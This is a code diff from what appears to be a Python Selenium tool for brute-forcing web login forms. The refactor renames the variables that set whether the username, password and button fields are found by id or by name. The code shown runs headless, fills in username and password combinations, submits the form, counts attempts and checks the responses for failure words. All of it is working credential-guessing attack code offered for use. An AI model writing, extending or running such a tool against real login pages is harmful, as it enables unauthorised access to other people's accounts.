@@ -30,28 +30,28 @@ def main():
     expression = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid"}
 
     u_name = get_user_input("username", "Username html element name (default: username): ", YELLOW)
-    u_el = get_user_input("i", "Is username element an id or a name? (i/n): ", YELLOW)
+    username_element_type = get_user_input("i", "Is username element an id or a name? (i/n): ", YELLOW)
 
     p_word = get_user_input("password", "Password html element name (default: password): ", BLUE)
-    p_el = get_user_input("i", "Is password element an id or a name? (i/n): ", BLUE)
+    password_element_type = get_user_input("i", "Is password element an id or a name? (i/n): ", BLUE)
 
     button = get_user_input("button", "Button html element name (default: button): ", GREEN)
-    b_el = get_user_input("i", "Is button element an id or a name? (i/n): ", GREEN)
+    button_element_type = get_user_input("i", "Is button element an id or a name? (i/n): ", GREEN)
 
-    if u_el == "i":
-        u_el = By.ID
-    elif u_el == "n":
-        u_el = By.NAME
+    if username_element_type == "i":
+        username_element_type = By.ID
+    elif username_element_type == "n":
+        username_element_type = By.NAME
 
-    if p_el == "i":
-        p_el = By.ID
-    elif p_el == "n":
-        p_el = By.NAME
+    if password_element_type == "i":
+        password_element_type = By.ID
+    elif password_element_type == "n":
+        password_element_type = By.NAME
 
-    if b_el == "i":
-        b_el = By.ID
-    elif b_el == "n":
-        b_el = By.NAME
+    if button_element_type == "i":
+        button_element_type = By.ID
+    elif button_element_type == "n":
+        button_element_type = By.NAME
 
     options = Options()
     options.headless = True
@@ -69,13 +69,13 @@ def main():
                 combinations_tested += 1
                 sys.stdout.write("\nCombinations tested: %d/%d" % (combinations_tested, total_combinations))
                 sys.stdout.flush()
-                brute(username, password, combinations_tested, total_combinations, driver, url, expression, u_el, u_name, p_el, p_word, b_el, button)
+                brute(username, password, combinations_tested, total_combinations, driver, url, expression, username_element_type, u_name, password_element_type, p_word, button_element_type, button)
     except KeyboardInterrupt:
         print("\n\033[91mExiting...\033[0m")
     finally:
         driver.quit()
 
-def brute(username, password, combinations_tested, total_combinations, driver, url, expression, u_el, u_name, p_el, p_word, b_el, button):
+def brute(username, password, combinations_tested, total_combinations, driver, url, expression, username_element_type, u_name, password_element_type, p_word, button_element_type, button):
     try:
         driver.get(url)
         print(colored_print("\nPage loaded successfully", GREEN))
@@ -96,11 +96,11 @@ def brute(username, password, combinations_tested, total_combinations, driver, u
         print(colored_print("Waiting for username input field to become visible...", BLUE))
 
         username_input = WebDriverWait(driver, 10).until(
-            EC.visibility_of_element_located((u_el, u_name))
+            EC.visibility_of_element_located((username_element_type, u_name))
         )
         print(colored_print("Username input field found and visible", YELLOW))
 
-        password_input = driver.find_element(p_el, p_word)
+        password_input = driver.find_element(password_element_type, p_word)
 
         username_input.clear()
         username_input.send_keys(username)
@@ -108,7 +108,7 @@ def brute(username, password, combinations_tested, total_combinations, driver, u
         password_input.send_keys(password)
 
         try:
-            submit_button = driver.find_element(b_el, button)
+            submit_button = driver.find_element(button_element_type, button)
             submit_button.click()
             print(colored_print("Form submission successful", GREEN))
             time.sleep(5)
